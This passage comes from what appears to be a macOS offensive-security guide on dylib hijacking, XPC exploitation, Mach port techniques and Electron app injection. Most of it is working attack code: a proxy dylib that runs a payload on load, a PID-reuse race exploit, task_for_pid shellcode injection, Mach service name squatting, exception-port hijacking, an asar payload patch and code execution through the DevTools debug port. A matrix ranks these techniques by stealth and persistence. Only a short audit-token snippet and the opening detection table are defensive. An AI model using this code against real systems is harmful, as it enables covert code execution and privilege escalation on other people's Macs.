| Unexpected dylibs loaded | `vmmap PID` or `DYLD_PRINT_LIBRARIES=1` output |
| XPC connection anomalies | Endpoint Security `es_event_type_t` XPC events |
| Electron debug port open | `lsof -i :9229` |
| osascript execution | Unified log: `log show --predicate 'process=="osascript"'` |
| Unsigned code execution | `codesign --verify` failures, Gatekeeper logs |


---
# Part 4: Dylib & XPC Techniques


## 1. DYLIB HIJACKING METHODOLOGY

### 1.1 Automated Discovery with DyLibHijackScanner

```bash
# Using DYLD_PRINT_RPATHS and DYLD_PRINT_LIBRARIES for analysis
DYLD_PRINT_RPATHS=1 DYLD_PRINT_LIBRARIES=1 /path/to/binary 2>&1 | tee /tmp/dylib_audit.txt

# Parse for missing libraries
grep "not found" /tmp/dylib_audit.txt
```

### 1.2 Manual Weak Dylib Enumeration

```bash
# Step 1: List all load commands
otool -l /path/to/binary > /tmp/loadcmds.txt

# Step 2: Extract weak dylib paths
grep -A 2 LC_LOAD_WEAK_DYLIB /tmp/loadcmds.txt | grep name | awk '{print $2}'

# Step 3: Check which are missing
while read lib; do
  [ ! -f "$lib" ] && echo "HIJACKABLE: $lib"
done < <(grep -A 2 LC_LOAD_WEAK_DYLIB /tmp/loadcmds.txt | grep name | awk '{print $2}')
```

### 1.3 Rpath Analysis

```bash
# Step 1: Enumerate rpath entries (order matters!)
otool -l /path/to/binary | grep -A 2 LC_RPATH | grep path | awk '{print $2}'

# Step 2: Find rpath-relative imports
otool -L /path/to/binary | grep @rpath | awk '{print $1}'

# Step 3: Resolve each @rpath import against rpath entries in order
# First match wins — if earlier rpath dir is writable, you win
```

### 1.4 Complete Dylib Proxy Template

```c
// proxy.c — forwards all symbols to the real dylib while executing payload

#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

// Constructor runs when dylib is loaded
__attribute__((constructor))
static void payload(void) {
    // Avoid running in unintended processes
    const char *proc = getprogname();
    if (strcmp(proc, "target_process") != 0) return;

    // Execute payload
    system("/path/to/payload.sh");
}

// Build with reexport to maintain original functionality:
// gcc -dynamiclib -o hijacked.dylib proxy.c \
//   -Wl,-reexport_library,/path/to/original_real.dylib \
//   -arch x86_64 -arch arm64 \
//   -framework Foundation
```

### 1.5 Signing the Proxy Dylib

```bash
# If target binary has library validation disabled, ad-hoc signing suffices
codesign -s - hijacked.dylib

# If target requires same-team signing, need a valid Developer ID
codesign -s "Developer ID Application: ..." hijacked.dylib

# If target has no library validation at all, no signing needed
```

### 1.6 Dylib Hijacking Priority Matrix

| Hijack Type | Reliability | Stealth | Persistence | Prerequisite |
|---|---|---|---|---|
| Weak dylib (missing) | High | High | Per-launch | Writable target path |
| @rpath (writable prefix) | High | High | Per-launch | Writable rpath dir |
| Proxy (replace existing) | High | Medium | Per-launch | Writable dylib location + re-export |
| DYLD_INSERT_LIBRARIES | High | Low | Per-invocation | Env var entitlement |
| DYLD_LIBRARY_PATH override | Medium | Low | Per-invocation | No Hardened Runtime |


## 2. XPC EXPLOITATION WALKTHROUGH

### 2.1 Identifying XPC Services and Their Entitlements

```bash
# List all XPC services in an app bundle
find /Applications/Target.app -name "*.xpc" -type d

# Read the XPC service's Info.plist
plutil -p /Applications/Target.app/Contents/XPCServices/Helper.xpc/Contents/Info.plist

# Check launchd plist for Mach service name
cat /Library/LaunchDaemons/com.target.helper.plist | grep -A 1 MachServices

# Dump XPC service entitlements
codesign -d --entitlements :- /Applications/Target.app/Contents/XPCServices/Helper.xpc/Contents/MacOS/Helper
```

### 2.2 XPC Connection Interception

```objc
// Connecting to a third-party privileged helper
#import <Foundation/Foundation.h>

int main() {
    NSXPCConnection *conn = [[NSXPCConnection alloc]
        initWithMachServiceName:@"com.target.helper"
        options:NSXPCConnectionPrivileged];

    // Set the expected protocol interface
    conn.remoteObjectInterface = [NSXPCInterface
        interfaceWithProtocol:@protocol(HelperProtocol)];

    conn.invalidationHandler = ^{ NSLog(@"Connection invalidated"); };
    conn.interruptionHandler = ^{ NSLog(@"Connection interrupted"); };

    [conn resume];

    // Call methods on the remote object
    [[conn remoteObjectProxyWithErrorHandler:^(NSError *err) {
        NSLog(@"Error: %@", err);
    }] performPrivilegedAction:@"payload"];

    [[NSRunLoop currentRunLoop] run];
    return 0;
}
```

### 2.3 PID Reuse Attack Implementation

```c
// pid_reuse.c — race condition exploit for PID-validated XPC
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <spawn.h>
#include <signal.h>

extern char **environ;

int main(int argc, char *argv[]) {
    pid_t target_pid = atoi(argv[1]);  // PID we want to impersonate

    // Fork rapidly to try to get the target PID
    for (int i = 0; i < 100000; i++) {
        pid_t child = fork();
        if (child == 0) {
            if (getpid() == target_pid) {
                // We got the target PID! Send XPC message now.
                execl("/path/to/xpc_client", "xpc_client", NULL);
            }
            _exit(0);
        }
        waitpid(child, NULL, 0);
    }
    return 0;
}
```

### 2.4 Audit Token Extraction

```objc
// Properly extracting audit token from XPC connection (for defenders/auditors)
- (BOOL)listener:(NSXPCListener *)listener
    shouldAcceptNewConnection:(NSXPCConnection *)conn {

    audit_token_t token = conn.auditToken;  // macOS 13+
    // Or via private API:
    // [conn valueForKey:@"auditToken"];

    // Verify code signature using audit token (SECURE)
    SecCodeRef code = NULL;
    NSDictionary *attrs = @{
        (__bridge NSString *)kSecGuestAttributeAudit: [NSData dataWithBytes:&token length:sizeof(token)]
    };
    SecCodeCopyGuestWithAttributes(NULL, (__bridge CFDictionaryRef)attrs, kSecCSDefaultFlags, &code);

    // Check requirement
    SecRequirementRef req = NULL;
    SecRequirementCreateWithString(
        CFSTR("identifier \"com.legit.client\" and anchor apple generic"),
        kSecCSDefaultFlags, &req);

    OSStatus status = SecCodeCheckValidity(code, kSecCSDefaultFlags, req);
    return (status == errSecSuccess);
}
```

---

## 3. MACH PORT TECHNIQUES

### 3.1 task_for_pid Memory Injection

```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

kern_return_t inject_shellcode(pid_t target_pid, void *shellcode, size_t size) {
    mach_port_t task;
    kern_return_t kr;

    // Get task port (requires root + non-SIP target)
    kr = task_for_pid(mach_task_self(), target_pid, &task);
    if (kr != KERN_SUCCESS) return kr;

    // Allocate memory in target
    mach_vm_address_t remote_addr = 0;
    kr = mach_vm_allocate(task, &remote_addr, size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) return kr;

    // Write shellcode
    kr = mach_vm_write(task, remote_addr, (vm_offset_t)shellcode, size);
    if (kr != KERN_SUCCESS) return kr;

    // Set executable permissions
    kr = mach_vm_protect(task, remote_addr, size, FALSE,
                         VM_PROT_READ | VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS) return kr;

    // Create remote thread
    x86_thread_state64_t state;
    memset(&state, 0, sizeof(state));
    state.__rip = remote_addr;

    thread_act_t thread;
    kr = thread_create_running(task, x86_THREAD_STATE64,
                               (thread_state_t)&state,
                               x86_THREAD_STATE64_COUNT, &thread);
    return kr;
}
```

### 3.2 Bootstrap Server Name Squatting

```c
#include <servers/bootstrap.h>
#include <mach/mach.h>

// Register a Mach service name before the legitimate service does
kern_return_t squat_service(const char *service_name) {
    mach_port_t bp, service_port;

    task_get_bootstrap_port(mach_task_self(), &bp);

    kern_return_t kr = bootstrap_check_in(bp, service_name, &service_port);
    if (kr == KERN_SUCCESS) {
        printf("[+] Squatted service: %s\n", service_name);
        // Now receive messages intended for the real service
        // Can inspect, modify, and forward them (MITM)
    }
    return kr;
}
```

### 3.3 Exception Port Hijacking

```c
#include <mach/mach.h>

// Set exception port on target to intercept crashes
kern_return_t hijack_exceptions(mach_port_t task) {
    mach_port_t exc_port;

    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exc_port);
    mach_port_insert_right(mach_task_self(), exc_port, exc_port,
                           MACH_MSG_TYPE_MAKE_SEND);

    // Intercept all exceptions
    kern_return_t kr = task_set_exception_ports(task,
        EXC_MASK_ALL,
        exc_port,
        EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,
        THREAD_STATE_NONE);

    // Now wait for exception messages
    // Can redirect execution by modifying thread state before replying
    return kr;
}
```

---

## 4. ELECTRON-SPECIFIC DEEP DIVE

### 4.1 Identifying Electron Apps

```bash
# Quick check for Electron framework
find /Applications -path "*/Electron Framework.framework" -maxdepth 5 2>/dev/null

# Or check for Electron-specific files
find /Applications -name "electron.asar" -o -name "app.asar" 2>/dev/null

# Get Electron version
strings "/Applications/Target.app/Contents/Frameworks/Electron Framework.framework/Electron Framework" | grep "Chrome/" | head -1
```

### 4.2 Extracting and Patching app.asar

```bash
# Install asar tool
npm install -g @electron/asar

# Extract app code
asar extract "/Applications/Target.app/Contents/Resources/app.asar" /tmp/app_extracted

# Modify main entry point (usually main.js or index.js)
# Add payload at top of entry script
echo 'require("child_process").execSync("id > /tmp/pwned");' > /tmp/payload.js
cat /tmp/payload.js /tmp/app_extracted/main.js > /tmp/app_extracted/main_patched.js
mv /tmp/app_extracted/main_patched.js /tmp/app_extracted/main.js

# Repack (only works if OnlyLoadAppFromAsar fuse is off)
asar pack /tmp/app_extracted "/Applications/Target.app/Contents/Resources/app.asar"
```

### 4.3 Chrome DevTools Protocol Exploitation

```python
import websocket
import json
import requests

# When --inspect port is open
debug_url = requests.get("http://127.0.0.1:9229/json").json()[0]["webSocketDebuggerUrl"]
ws = websocket.create_connection(debug_url)

# Execute arbitrary code in the Electron main process
ws.send(json.dumps({
    "id": 1,
    "method": "Runtime.evaluate",
    "params": {
        "expression": "require('child_process').execSync('id').toString()"
    }
}))

result = json.loads(ws.recv())
print(result["result"]["result"]["value"])
```

---

## 5. INJECTION TECHNIQUE COMPARISON MATRIX

| Technique | Root Required | SIP Bypass Needed | Survives Reboot | TCC Inheritance | Stealth |
|---|---|---|---|---|---|
| DYLD_INSERT_LIBRARIES | No | No (if entitled) | No | Yes | Low |
| Weak dylib hijack | No | No | Yes (per-launch) | Yes | High |
| @rpath hijack | No | No | Yes (per-launch) | Yes | High |
| Dylib proxy | No | No | Yes (per-launch) | Yes | Medium |
| XPC exploitation | No | No | Per-connection | Varies | Medium |
| task_for_pid | Yes | Yes (for Apple bins) | No | No | Low |
| ELECTRON_RUN_AS_NODE | No | No | No | Yes | Low |
| Electron asar patch | No | No | Yes | Yes | Medium |
| osascript | No | No | No | Automation only | Low |
